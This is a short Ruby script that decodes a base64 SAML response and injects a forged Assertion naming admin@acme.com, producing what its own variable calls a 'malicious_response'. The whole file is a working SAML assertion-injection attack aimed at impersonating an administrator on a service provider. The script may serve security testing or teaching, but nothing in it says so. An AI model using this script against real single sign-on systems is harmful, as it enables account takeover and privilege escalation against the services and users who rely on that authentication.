require 'uri'
require 'base64'
require 'zlib'

# URL-decode
str = URI.unescape ARGV[0]

# base64 decode
response = Base64.decode64(str)

new_assertion = '</Assertion><Assertion ID="9999"><Subject><NameID>admin@acme.com</NameID></Subject></Assertion>'

malicious_response = response.gsub("</Assertion>", new_assertion)

puts malicious_response
